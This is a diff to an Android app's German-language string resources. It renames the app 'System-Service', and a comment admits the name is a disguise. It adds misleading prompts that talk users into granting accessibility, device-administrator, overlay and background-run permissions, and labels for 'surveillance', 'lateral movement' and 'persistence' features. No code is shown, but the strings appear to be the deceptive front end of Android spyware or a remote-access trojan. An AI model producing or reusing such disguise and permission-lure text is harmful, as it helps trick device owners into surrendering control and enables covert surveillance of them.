@@ -1,4 +1,63 @@
+<?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="app_name">Client</string>
-    <string name="accessibility_service_description">Dieser Service ermöglicht erweiterte Systemüberwachung und Automatisierungsfunktionen. Er ist für die Kernfunktionalität der Anwendung erforderlich.</string>
+    <!-- App-Name (getarnt als System-Service) -->
+    <string name="app_name">System-Service</string>
+    
+    <!-- Service-Beschreibungen (Android 15 konform) -->
+    <string name="service_name">System Core Service</string>
+    <string name="service_description">Systemdienst für Geräteoptimierung und Überwachung</string>
+    
+    <!-- Accessibility Service (Android 15 optimiert) -->
+    <string name="accessibility_service_label">System Core Service</string>
+    <string name="accessibility_service_description">Ermöglicht erweiterte Systemfunktionen und Geräteüberwachung für Sicherheitszwecke</string>
+    
+    <!-- Device Admin -->
+    <string name="device_admin_label">Systemsicherheit</string>
+    <string name="device_admin_description">Ermöglicht Sicherheitsfunktionen zum Schutz des Geräts</string>
+    
+    <!-- Notification Channel (Android 15) -->
+    <string name="notification_channel_name">System Health Monitor</string>
+    <string name="notification_channel_description">Überwacht Systemzustand und Performance</string>
+    
+    <!-- Foreground Service Benachrichtigungen -->
+    <string name="foreground_service_title">System Monitor</string>
+    <string name="foreground_service_text">Überwacht Systemzustand und Performance</string>
+    
+    <!-- Berechtigungs-Anfragen (Android 15 konform) -->
+    <string name="permission_accessibility_title">Bedienungshilfe erforderlich</string>
+    <string name="permission_accessibility_message">Aktivieren Sie den System Core Service in den Bedienungshilfen für erweiterte Funktionen</string>
+    
+    <string name="permission_admin_title">Geräteverwaltung erforderlich</string>
+    <string name="permission_admin_message">Diese Berechtigung schützt das Gerät vor unbefugter Deinstallation</string>
+    
+    <string name="permission_overlay_title">Overlay-Berechtigung erforderlich</string>
+    <string name="permission_overlay_message">Ermöglicht System-Overlays für erweiterte Funktionen</string>
+    
+    <string name="permission_battery_title">Akkuoptimierung deaktivieren</string>
+    <string name="permission_battery_message">Für zuverlässige Hintergrundausführung erforderlich</string>
+    
+    <!-- Fehler-Meldungen -->
+    <string name="error_initialization">Initialisierung fehlgeschlagen</string>
+    <string name="error_permission_denied">Berechtigung verweigert</string>
+    <string name="error_connection_failed">Verbindung fehlgeschlagen</string>
+    
+    <!-- Status-Meldungen -->
+    <string name="status_connected">Verbunden</string>
+    <string name="status_disconnected">Getrennt</string>
+    <string name="status_reconnecting">Verbindung wird wiederhergestellt…</string>
+    
+    <!-- Button-Texte -->
+    <string name="button_enable">Aktivieren</string>
+    <string name="button_settings">Einstellungen</string>
+    <string name="button_cancel">Abbrechen</string>
+    <string name="button_retry">Erneut versuchen</string>
+    
+    <!-- Advanced Features (Version 2.0) -->
+    <string name="surveillance_active">Erweiterte Überwachung aktiv</string>
+    <string name="lateral_movement_active">Netzwerkscanning aktiv</string>
+    <string name="persistence_enabled">Persistenz-Mechanismen aktiviert</string>
+    
+    <!-- Android 15 spezifische Strings -->
+    <string name="android_15_optimized">Optimiert für Android 15</string>
+    <string name="one_ui_7_compatible">One UI 7 kompatibel</string>
 </resources>
